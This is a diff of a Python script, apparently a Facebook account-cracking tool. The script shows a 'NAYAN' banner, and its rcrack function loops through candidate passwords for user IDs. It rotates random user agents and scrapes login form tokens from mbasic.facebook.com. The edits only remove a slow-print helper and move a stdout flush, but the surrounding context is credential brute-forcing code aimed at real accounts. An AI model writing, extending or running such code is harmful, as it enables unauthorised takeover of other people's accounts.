@@ -88,11 +88,6 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
-def jalan(z):
-    for e in z + '\n':
-        sys.stdout.write(e)
-        sys.stdout.flush()
-        time.sleep(0.001)
 logo ="""
 \033[0;92m╔══════════════════════════════════════════════╗
 \033[0;32m║ ███    ██  \033[0;31m█████  \033[0;93m██    ██  \033[0;32m█████  \033[0;31m███    ██\033[0;92m ║
@@ -215,8 +210,6 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r \33[1;92m[NAYAN] [%s] \33[1;92m[OK:\33[1;92m%s\33[1;92m]'%(loop,len(oks))),
-            sys.stdout.flush()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -262,8 +255,9 @@ def rcrack(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.flush()
+        
         sys.stdout.write('\r \033[1;91m[\033[1;97m\033[1;91m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
+        sys.stdout.flush()
     except:
         pass
 
